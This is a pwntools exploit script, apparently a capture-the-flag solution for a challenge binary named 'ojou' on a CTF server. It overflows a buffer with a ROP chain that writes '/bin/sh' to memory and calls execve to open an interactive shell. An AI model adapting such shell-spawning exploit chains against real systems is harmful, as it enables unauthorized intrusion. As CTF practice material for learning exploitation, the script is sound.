#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/ojou"
TARGET = DIR + EXECUTABLE 
HOST, PORT = "ctf.tcp1p.com", 6666
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
elfROP = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][2],
    terminal = ['tmux', 'split-window', '-h'],
)

# ==========================[ Exploit

def exploit(io, libc=null):
    if LOCAL==True:
        #raw_input("Fire GDB!")
        if len(sys.argv) > 1 and sys.argv[1] == "d":
            choosen_gdb = [
                "source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py",     # 0 - pwndbg
                "source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda
                "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef
                ][0]
            cmd = choosen_gdb + f"""
            # set follow-fork-mode child
            file {TARGET}
            # b *0x47dae0+0x2b0
            # b *0x47dae0+738
            # b *0x47dae0+909
            b *0x47dae0+0x2e2
            b *0x47dae0+0x16f
            """
            gdb.attach(io, gdbscript=cmd)

    MAIN_ADDRESS = 0x47dae0

    # === Gadget
    BSS_ADDRESS = 0x524100
    POP_RBX = 0x0000000000404541 # : pop rbx ; ret
    POP_RDX = 0x0000000000479d7a # : pop rdx ; ret
    POP_RAX_RBP = 0x00000000004723ca # : pop rax ; pop rbp ; ret
    POP_RDI_LOAD_PTR_RAX = 0x00000000004726a4 # : pop rdi ; add al, byte ptr [rax] ; mov ebx, 0xb ; ret
    MOV_QWORDPTR_RAX0x18_RBX = 0x0000000000415312 # : mov qword ptr [rax + 0x18], rbx ; ret
    SYSCALL = 0x000000000040316c # : syscall

    RIP_OFFSET = cyclic_find(0x61676461)
    p = b""
    p += b"Ojou! <3"
    p += cyclic(RIP_OFFSET).replace(p64(0x61706261616f6261), p64(0x0))
    p += p64(POP_RAX_RBP)
    p += p64(BSS_ADDRESS-0x18)
    p += p64(0xdeadbeef)
    p += p64(POP_RBX)
    p += p64(u64(b"/bin/sh\x00"))
    p += p64(MOV_QWORDPTR_RAX0x18_RBX)

    p += p64(POP_RDI_LOAD_PTR_RAX) # rax is pointing to valid address
    p += p64(BSS_ADDRESS)

    p += p64(POP_RDX)
    p += p64(0)

    p += p64(POP_RAX_RBP)
    p += p64(0x3b)
    p += p64(0xdeadbeef)
    p += p64(SYSCALL) # sys_execve('/bin/sh', NULL, NULL)

    io.sendlineafter(b">", p)

    io.interactive()

if __name__ == "__main__":
    io, libc = null, null

    if args.REMOTE:
        REMOTE = True
        io = remote(HOST, PORT)
        # libc = ELF("___")
        
    else:
        LOCAL = True
        io = process(
            [TARGET, ],
            env={
            #     "LD_PRELOAD":DIR+"/___",
            #     "LD_LIBRARY_PATH":DIR+"/___",
            },
        )
        # libc = ELF("___")
    exploit(io, libc)
